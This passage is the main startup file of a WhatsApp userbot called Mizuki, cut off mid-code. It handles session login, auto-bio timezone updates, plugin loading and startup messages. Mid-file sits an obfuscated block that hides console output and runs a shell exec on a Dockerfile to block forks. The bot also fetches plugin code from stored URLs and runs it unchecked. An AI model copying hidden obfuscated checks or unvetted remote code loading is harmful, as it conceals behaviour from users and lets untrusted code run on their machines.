/* Copyright (C) 2020 Yusuf Usta. - Copyright (C) 2021 Mr.joka.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

👸 Mizuki 1.0 beta version  
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const exec = require('child_process').exec;
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Mizuki/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const mizukiDB = config.DATABASE.define('mizukiwatasappbot', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94715343050,0' , co: '94766239744,0' }

String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function mizuki () {
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2, 2140, 12]
    
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
                if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    await config.DATABASE.sync();
    var StrSes_Db = await mizukiDB.findAll({
        where: {
          info: 'StringSession'
        }
    }); 
    (function(_0x2eb75c,_0x1d8986){var _0x42d365=_0x2eb75c();function _0x4ef8c7(_0x57bf31,_0x24d32a,_0x5d7d43,_0x1ac8e2){return _0x4122(_0x57bf31-0x2c6,_0x1ac8e2);}function _0x9043de(_0x447dfd,_0x49496a,_0x3ef942,_0x2e301c){return _0x4122(_0x49496a-0x39c,_0x3ef942);}while(!![]){try{var _0x1a31a6=parseInt(_0x4ef8c7(0x39d,0x3be,0x3b7,0x38f))/(0x8ef*-0x1+-0x2151+0x2a41)+-parseInt(_0x4ef8c7(0x37b,0x369,0x360,0x372))/(-0xa5+0x1*-0x1e0e+0x1eb5)+parseInt(_0x9043de(0x43a,0x45a,0x46c,0x43c))/(0x1*-0xb52+-0x1eb1+0x2a06)*(-parseInt(_0x9043de(0x45a,0x476,0x462,0x491))/(0x1*-0xc5+0x1b4a+0x54d*-0x5))+parseInt(_0x4ef8c7(0x395,0x39e,0x395,0x37f))/(-0x65c*0x5+0x18*0x58+0x1791)*(parseInt(_0x4ef8c7(0x38e,0x392,0x384,0x3a3))/(0x615*0x1+0x25c3+-0x8e*0x4f))+parseInt(_0x9043de(0x42b,0x44d,0x45b,0x470))/(-0x21d*-0x8+-0x1091+0x50*-0x1)+-parseInt(_0x9043de(0x42e,0x447,0x443,0x425))/(-0x13db+-0xcb9*-0x1+0x72a)+-parseInt(_0x4ef8c7(0x398,0x38e,0x396,0x39e))/(0xe76+0x58c+-0x13f9)*(parseInt(_0x4ef8c7(0x39c,0x382,0x383,0x3ba))/(0xb2*0x34+-0x54a*0x3+-0x1440));if(_0x1a31a6===_0x1d8986)break;else _0x42d365['push'](_0x42d365['shift']());}catch(_0x7bb19){_0x42d365['push'](_0x42d365['shift']());}}}(_0x5086,-0xbb76+-0x12a63+0x3fb8e*0x1));function _0x4122(_0x508650,_0x41226e){var _0x3c7c6f=_0x5086();return _0x4122=function(_0x59c821,_0x5d0db1){_0x59c821=_0x59c821-(0xb09+-0x1*-0x2c4+-0xd30);var _0x53d4d3=_0x3c7c6f[_0x59c821];return _0x53d4d3;},_0x4122(_0x508650,_0x41226e);}function _0x5086(){var _0xeff968=['XwQBd','pNQcn','{}.constru','Yvqmt','__proto__','constructo','VaFyL','zuki\x20/root','72ObQCiR','KiBHy','wDEeg','wgnXN','RxaxW','1|5|0|2|3|','length','error','vKbkv','Don\x27t\x20Edit','6654cRWuRM','i\x20User...\x20','YTgus','one\x20https:','//github.c','return\x20(fu','RUN\x20git\x20cl','1085iIFCXw','info','/QueenMizu','27sRhmVu','wZLOh','PTvEL','SKTMl','118210SZzitw','160077fdFXsw','mpqqb','console','13576OdJKPC','bind','Thejaka/Mi','AeZua','tsasena/Do','Fake\x20Mizuk','sAsenaDupl','wBvhP','oHBzA','prototype','WddfD','om/MrJoka-','aWraI','rn\x20this\x22)(','log','wuilh','exception','split','y!!','table','ScDFe','ctor(\x22retu','WVoCW','256736bBParF','nction()\x20','qhaUd','ckerfile','GhMqS','0|5|2|4|3|','759514lJzdPC','CaCJP','Yhisy','toString','447184jSsAEg'];_0x5086=function(){return _0xeff968;};return _0x5086();}function _0x251f39(_0x4c952f,_0x22b4a0,_0x69942e,_0x1e4a21){return _0x4122(_0x4c952f-0x36e,_0x1e4a21);}var _0x2d01a2=(function(){var _0x27183e=!![];return function(_0x36a717,_0x27599c){var _0x59db8b=_0x27183e?function(){if(_0x27599c){var _0x3fd231=_0x27599c['apply'](_0x36a717,arguments);return _0x27599c=null,_0x3fd231;}}:function(){};return _0x27183e=![],_0x59db8b;};}()),_0x4fed1c=_0x2d01a2(this,function(){var _0x379fb0={'WVoCW':'1|4|2|0|3','WddfD':_0x228385(0x175,0x17d,0x179,0x17e),'Yhisy':'warn','PTvEL':_0x4d5923(-0x16a,-0x16c,-0x169,-0x16f),'wDEeg':_0x4d5923(-0x175,-0x177,-0x169,-0x177),'wuilh':_0x4d5923(-0x1b0,-0x198,-0x1a8,-0x18e),'aWraI':_0x228385(0x17a,0x18e,0x165,0x195),'YTgus':'trace','vKbkv':function(_0x31d7b4,_0x34a6fe){return _0x31d7b4<_0x34a6fe;},'KiBHy':_0x228385(0x183,0x193,0x177,0x18c)+'1','RxaxW':function(_0x2ce57f,_0x26fa85){return _0x2ce57f(_0x26fa85);},'qhaUd':function(_0xb4bc70,_0x45e13c){return _0xb4bc70+_0x45e13c;},'Yvqmt':_0x228385(0x18b,0x182,0x176,0x176)+_0x4d5923(-0x19e,-0x193,-0x1aa,-0x18d)+_0x4d5923(-0x1be,-0x19b,-0x1a8,-0x18a)+'\x20)','oHBzA':function(_0x911a80){return _0x911a80();},'XwQBd':'wBvhP','AeZua':function(_0x26570f,_0x511c74){return _0x26570f+_0x511c74;},'GhMqS':function(_0x5497c0,_0xfde56e){return _0x5497c0+_0xfde56e;},'vZGbj':_0x4d5923(-0x16c,-0x16f,-0x17f,-0x187)+_0x4d5923(-0x1a0,-0x190,-0x192,-0x174),'kFuoQ':function(_0x503690){return _0x503690();},'mpqqb':_0x4d5923(-0x18c,-0x194,-0x180,-0x1a2),'pNQcn':_0x228385(0x18f,0x18e,0x16c,0x1ad),'ncvCL':function(_0x51b780,_0x3e25af){return _0x51b780<_0x3e25af;},'wZLOh':_0x228385(0x196,0x1b0,0x184,0x183)+'4'},_0x4829ff;function _0x228385(_0x411e45,_0x5a3089,_0x1bb9a7,_0x36b466){return _0x4122(_0x411e45-0xd3,_0x36b466);}function _0x4d5923(_0x1d96d7,_0x221fbe,_0x53c21f,_0x2e9ce5){return _0x4122(_0x221fbe- -0x23c,_0x1d96d7);}try{if(_0x228385(0x1b4,0x1a8,0x1ce,0x199)!==_0x379fb0[_0x228385(0x189,0x18b,0x196,0x166)]){var _0x403759=_0x244799['apply'](_0x1a699f,arguments);return _0xc4534f=null,_0x403759;}else{var _0x41c4fa=_0x379fb0[_0x4d5923(-0x18b,-0x17a,-0x18e,-0x17f)](Function,_0x379fb0[_0x4d5923(-0x158,-0x15f,-0x13f,-0x14d)](_0x379fb0[_0x228385(0x182,0x196,0x195,0x18d)](_0x379fb0['vZGbj'],_0x379fb0['Yvqmt']),');'));_0x4829ff=_0x379fb0['kFuoQ'](_0x41c4fa);}}catch(_0x591483){if(_0x379fb0[_0x4d5923(-0x182,-0x164,-0x176,-0x179)]===_0x379fb0[_0x4d5923(-0x188,-0x185,-0x179,-0x182)]){var _0x5faf14=_0x379fb0[_0x4d5923(-0x181,-0x192,-0x18e,-0x16f)]['split']('|'),_0x5308d7=0x57a+0x1064+0x2*-0xaef;while(!![]){switch(_0x5faf14[_0x5308d7++]){case'0':var _0x2c329c=[_0x379fb0[_0x4d5923(-0x1a1,-0x19e,-0x189,-0x1a3)],_0x379fb0[_0x4d5923(-0x199,-0x189,-0x17d,-0x1a7)],_0x379fb0[_0x4d5923(-0x15d,-0x168,-0x173,-0x15a)],_0x379fb0[_0x228385(0x193,0x17c,0x1a9,0x1a3)],_0x379fb0[_0x228385(0x176,0x18c,0x177,0x187)],_0x379fb0[_0x228385(0x173,0x17a,0x18b,0x16e)],_0x379fb0[_0x228385(0x19d,0x18a,0x19c,0x1a3)]];continue;case'1':var _0x23e1cf;continue;case'2':var _0x557079=_0x23e1cf[_0x4d5923(-0x167,-0x163,-0x16d,-0x17d)]=_0x23e1cf[_0x4d5923(-0x176,-0x163,-0x153,-0x164)]||{};continue;case'3':for(var _0x36574c=0x2447*-0x1+-0x165b+0x3aa2;_0x379fb0[_0x4d5923(-0x18b,-0x176,-0x18d,-0x186)](_0x36574c,_0x2c329c[_0x4d5923(-0x165,-0x178,-0x193,-0x194)]);_0x36574c++){var _0x476c53=_0x379fb0[_0x228385(0x192,0x1af,0x184,0x180)][_0x228385(0x178,0x17a,0x185,0x17c)]('|'),_0x2c5a46=0x168+0xf23+-0x108b;while(!![]){switch(_0x476c53[_0x2c5a46++]){case'0':var _0x27d3ee=_0xd4413d[_0x228385(0x18e,0x176,0x1aa,0x181)+'r'][_0x228385(0x170,0x15f,0x190,0x17e)]['bind'](_0x1c7e63);continue;case'1':_0x557079[_0x512f09]=_0x27d3ee;continue;case'2':var _0x4e1d83=_0x557079[_0x512f09]||_0x27d3ee;continue;case'3':_0x27d3ee[_0x228385(0x187,0x198,0x1a2,0x192)]=_0x4e1d83['toString'][_0x4d5923(-0x14c,-0x161,-0x16e,-0x174)](_0x4e1d83);continue;case'4':_0x27d3ee[_0x228385(0x18d,0x17b,0x19f,0x19c)]=_0x5cf7f1[_0x4d5923(-0x17a,-0x161,-0x17a,-0x141)](_0x1285e9);continue;case'5':var _0x512f09=_0x2c329c[_0x36574c];continue;}break;}}continue;case'4':try{var _0x1a35d7=_0x379fb0['RxaxW'](_0x41b975,_0x379fb0[_0x228385(0x180,0x160,0x182,0x17d)](_0x228385(0x1a0,0x1b4,0x194,0x184)+_0x4d5923(-0x194,-0x190,-0x1a4,-0x1ab),_0x379fb0[_0x228385(0x18c,0x189,0x1a2,0x176)])+');');_0x23e1cf=_0x379fb0[_0x228385(0x1b5,0x1a3,0x1d3,0x1c0)](_0x1a35d7);}catch(_0x55abce){_0x23e1cf=_0x4a63f6;}continue;}break;}}else _0x4829ff=window;}var _0x4c263d=_0x4829ff['console']=_0x4829ff['console']||{},_0x126ba7=[_0x379fb0[_0x228385(0x171,0x14e,0x18d,0x187)],_0x379fb0[_0x4d5923(-0x187,-0x189,-0x173,-0x186)],_0x379fb0[_0x228385(0x1a7,0x1b7,0x189,0x1a6)],'error',_0x379fb0[_0x228385(0x176,0x158,0x18f,0x185)],_0x379fb0[_0x4d5923(-0x19a,-0x19c,-0x1a6,-0x1a4)],_0x379fb0['YTgus']];for(var _0xe4ea26=-0x4*0x337+0x221b*-0x1+0x2ef7;_0x379fb0['ncvCL'](_0xe4ea26,_0x126ba7[_0x4d5923(-0x19b,-0x178,-0x160,-0x199)]);_0xe4ea26++){var _0x1a5231=_0x379fb0[_0x4d5923(-0x15c,-0x169,-0x172,-0x180)][_0x4d5923(-0x1b9,-0x197,-0x17a,-0x185)]('|'),_0x220794=0x241f+0x12e0+-0x169*0x27;while(!![]){switch(_0x1a5231[_0x220794++]){case'0':var _0x40fdb6=_0x4c263d[_0x3b9ca9]||_0x10e62b;continue;case'1':var _0x10e62b=_0x2d01a2[_0x4d5923(-0x16e,-0x181,-0x160,-0x17e)+'r'][_0x4d5923(-0x1a5,-0x19f,-0x17d,-0x186)]['bind'](_0x2d01a2);continue;case'2':_0x10e62b['__proto__']=_0x2d01a2[_0x4d5923(-0x153,-0x161,-0x141,-0x176)](_0x2d01a2);continue;case'3':_0x10e62b['toString']=_0x40fdb6[_0x228385(0x187,0x187,0x185,0x199)]['bind'](_0x40fdb6);continue;case'4':_0x4c263d[_0x3b9ca9]=_0x10e62b;continue;case'5':var _0x3b9ca9=_0x126ba7[_0xe4ea26];continue;}break;}}});_0x4fed1c();function _0x215c5b(_0x29be7c,_0x47d236,_0x458dc1,_0x1a55df){return _0x4122(_0x458dc1- -0x36c,_0x29be7c);}var sdn=_0x215c5b(-0x2c1,-0x2b4,-0x29e,-0x295)+_0x215c5b(-0x28a,-0x2a7,-0x2a1,-0x28d)+_0x251f39(0x43a,0x440,0x45a,0x431)+_0x251f39(0x40d,0x40a,0x419,0x3eb)+_0x251f39(0x44a,0x453,0x442,0x44b)+_0x215c5b(-0x297,-0x2a5,-0x2af,-0x2cf)+_0x251f39(0x43f,0x435,0x423,0x45e)+'ki'+'\x0a';exec('sed\x20-n\x203p\x20'+'/root/What'+_0x215c5b(-0x279,-0x27c,-0x28c,-0x29d)+'icated/wha'+_0x251f39(0x44c,0x469,0x467,0x453)+_0x251f39(0x41c,0x411,0x408,0x405),async(_0x10bdd9,_0x24ebb5,_0x511475)=>{var _0x20f263={};_0x20f263['xqLKr']=function(_0x11a6ce,_0x58a6ae){return _0x11a6ce!==_0x58a6ae;},_0x20f263[_0x571ae7(-0xc4,-0xa2,-0xb5,-0xa3)]=function(_0x466567,_0x4931ca){return _0x466567===_0x4931ca;};function _0x4872da(_0x110366,_0x356543,_0x2d190f,_0x3c643e){return _0x251f39(_0x2d190f- -0x6d8,_0x356543-0xe0,_0x2d190f-0x1e8,_0x110366);}function _0x571ae7(_0x2147f6,_0x158281,_0x147231,_0x5d7a61){return _0x215c5b(_0x147231,_0x158281-0x117,_0x2147f6-0x1d3,_0x5d7a61-0x108);}_0x20f263[_0x4872da(-0x2a9,-0x2bb,-0x2b8,-0x2b9)]=_0x571ae7(-0xd8,-0xdd,-0xf6,-0xd8);var _0x171d3e=_0x20f263;if(_0x171d3e['xqLKr'](sdn,_0x24ebb5)){if(_0x171d3e['SKTMl'](_0x171d3e[_0x571ae7(-0xe7,-0x102,-0xf2,-0xf1)],_0x171d3e[_0x4872da(-0x2a8,-0x2be,-0x2b8,-0x2ba)]))throw new Error(_0x571ae7(-0xba,-0xc7,-0xc9,-0xb6)+_0x571ae7(-0xd0,-0xf1,-0xe6,-0xc0)+_0x571ae7(-0xd2,-0xb7,-0xef,-0xb2)+'\x20Repositor'+_0x571ae7(-0xf3,-0xfd,-0x114,-0x105));else{var _0x131000=_0x21f9ce[_0x571ae7(-0xde,-0xdf,-0xf0,-0xbf)+'r'][_0x571ae7(-0xfc,-0x11b,-0x110,-0xf5)][_0x4872da(-0x271,-0x29b,-0x28f,-0x274)](_0x42a900),_0x4d8819=_0x338212[_0x3e0e35],_0x37ee9e=_0x30697c[_0x4d8819]||_0x131000;_0x131000[_0x4872da(-0x2bc,-0x2c0,-0x2b0,-0x298)]=_0x130c0a[_0x571ae7(-0xbe,-0xcc,-0xa9,-0xb0)](_0xd396c),_0x131000['toString']=_0x37ee9e[_0x571ae7(-0xe5,-0xe7,-0xf5,-0xc7)][_0x571ae7(-0xbe,-0xaf,-0xdf,-0xbd)](_0x37ee9e),_0x516b0b[_0x4d8819]=_0x131000;}}});
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await mizukiDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Mizuki')}${chalk.blue.bold('Bot')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        ); 
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
          });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================
        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('👸 Mizuki' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'SI' ? '*Mizuki Chatbot කෙනෙකු ලෙස ක්‍රියා කරයි!* 👸\n\n_මෙම මාදිලියේ පරමාර්ථය නම් බොට් එක සම්පුර්ණ ක්‍රියාකාරී කෘත්‍රිම බුද්ධි චැට් මෙවලමක් බවට පත් කිරීමයි._\n_පෙර පැවති ආකාරයට ආපසු යාමට_ *.fulleva off* _කමාන්ඩ් එක use කරන්න පුළුවන්._\n\n*Mizuki භාවිත කරනවාට ස්තූතියි 💌*\n    *- Eva and Mr.joka*' : '*Mizuki Works as an Chatbot!* 👸\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using Mizuki 💌*\n    *- Eva*'
        
        if (config.WORKTYPE == 'public') {
        var userjidlogo = await axios.get(config.USER_LOGO, { responseType: 'arraybuffer' })
        const publicmsg = '*Mizuki පබ්ලික්(සැමට භාවිත කල හැකි) ආකාරයට වැඩ කරයි. 👸*\n\n_කරුණාකර මෙහි Plugins භාවිත නොකරන්න. මෙය ඔබේ LOG අංකයයි._\n_ඔබට වෙනත් ඕනෑම කතාබහක දී විධානයන් භාවිත කළ හැකිය :)_\n\n*ඔබේ බොට් පබ්ලික්(සැමට භාවිත කල හැකි ලෙස) ක්‍රියා කරයි. වෙනස් කිරීමට* _.setvar WORK_TYPE:private_ *විධානය භාවිතා කරන්න.*\n\n*Mizuki භාවිත කරනවාට ස්තූතියි 💌*'
        const publicmsgen = '*Mizuki Working as Public! 👸*\n\n_Please do not try plugins here. This is your LOG number._\n_You can use commands in any other chat :)_\n\n*Your bot is working as public. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using Mizuki 💌*'
            if (config.LANG == 'SI') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: publicmsg});
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```යාවත්කාලීන කිරීමට``` *.update now* ```භාවිත කරන්න```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: EVA_ACTİON})
                } else {
                    await conn.sendMessage(conn.user.jid, Buffer.from(userjidlogo.data), MessageType.image, {mimetype: Mimetype.png, caption: publicmsgen});
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔹 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            var pvtuserjidlog = await axios.get(config.USER_LOGO, { responseType: 'arraybuffer' })
